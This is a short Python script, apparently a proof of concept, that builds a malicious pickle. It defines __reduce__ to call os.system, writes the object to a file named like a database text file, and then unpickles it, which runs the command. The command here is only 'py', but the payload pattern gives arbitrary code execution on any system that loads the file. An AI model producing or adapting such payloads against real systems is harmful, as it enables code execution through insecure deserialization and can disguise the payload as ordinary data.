import pickle
import os
class Pickle(object):
    def __reduce__(self):
        return os.system, ('py',)
object = Pickle()

with open("offsite_database_modified.txt","wb") as f:
  pickle.dump(object,f)

with open("offsite_database_modified.txt","rb") as f:
  pickle.load(f)